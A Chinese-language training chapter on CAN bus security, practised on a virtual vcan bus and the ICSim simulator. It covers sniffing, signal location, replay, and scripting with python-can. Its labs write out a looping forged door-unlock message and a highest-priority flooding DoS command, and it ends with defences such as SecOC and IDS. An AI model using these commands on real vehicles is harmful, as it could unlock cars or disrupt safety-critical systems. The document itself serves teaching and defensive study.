# 02 · CAN 总线安全实操

> 本篇全部在**虚拟总线 / 台架环境**完成，不涉及真实车辆。

## 环境搭建（Linux + SocketCAN）

```bash
# 内置 vcan 模块, 无需硬件
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# 工具
sudo apt install can-utils python3-can
```

验证：`ip -details link show vcan0`

## can-utils 核心命令

```bash
candump vcan0                       # 抓包
candump -n 20 vcan0                 # 抓 20 帧退出
candump -L vcan0 > can.log          # 日志格式(可回放)
cansend vcan0 123#DEADBEEF          # 发送: ID#数据(16进制)
cansniffer -c vcan0                 # 多 ID 排序显示, 变化字节标红(找信号利器)
candump vcan0 | grep "  123   "     # 过滤特定 ID
log2asc can.log                      # 日志转换
canplayer vcan0=can.log             # 回放(重放攻击基础)
```

## 基础实验

### 实验 1：认识报文

```bash
cansend vcan0 188#0102030405060708
candump vcan0
#  vcan0  188   [8]  01 02 03 04 05 06 07 08
#          ID    DLC  数据字节
```

### 实验 2：信号定位（找车速在哪个字节）

1. `cansniffer -c vcan0` 观察平稳值
2. 制造变化（如缓慢加速），看哪个字节连续变化
3. 常见规律：车速/转速常用 16bit 大端，值 = 高字节<<8 | 低字节，有的还乘缩放因子

### 实验 3：ICSim 靶场（推荐入门）

```bash
git clone https://github.com/zombieCraig/ICSim && cd ICSim && ./setup_vcan.sh
./icsim.sh                    # 仪表盘 + 控制面板 + SocketCAN
# 用 cansniffer 找出: 转向灯/车速表/门锁 对应的 ID 和字节
```

### 实验 4：报文伪造

```bash
# 定位到门锁 ID 后, 反复发送"解锁"报文
while true; do cansend vcan0 188#0000000000000000; sleep 0.01; done
```

### 实验 5：DoS（只在实验环境！）

```bash
# 抢占最高优先级 ID(0x000) 持续发送 → 高优先级报文发不出去
cansend vcan0 000#00000000
```

> 真车 DoS 可能影响刹车/转向等安全功能，**绝对禁止**。

## python-can 脚本化

```python
import can

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

# 发送
msg = can.Message(arbitration_id=0x188, data=[1,2,3,4,5,6,7,8], is_extended_id=False)
bus.send(msg)

# 接收(带过滤)
bus.set_filters([{"can_id": 0x188, "can_mask": 0x7FF}])
while True:
    m = bus.recv()
    print(f"ID={m.arbitration_id:#05x} DATA={m.data.hex()}")
```

## 进阶方向

| 方向 | 内容 | 工具 |
|---|---|---|
| DBC 逆向 | 从抓包还原信号定义 | `cantools` python 库, DBC Editor |
| 总线嗅探自动化 | 变化检测+字典暴力对应 | 自写脚本 |
| 网关过滤测试 | 跨域报文能否通过网关 | 双 vcan + 网关模拟(开源 virtual EGW) |
| 硬件接入 | 真车/台架/OBD 读取 | CANable(~¥100) + 分线盒 |

## 防御视角（为第 05 篇铺垫）

CAN 结构性缺陷 → 补救：**网关过滤、secOC(认证+防重放)、IDS 异常检测（ID/频率/DLC 基线）**。

## 检验问题

- [ ] cansniffer 找信号的思路是什么？
- [ ] 为什么伪造报文如此容易？接收节点如何"信任"报文？
- [ ] DoS 攻击利用了 CAN 的哪个机制？
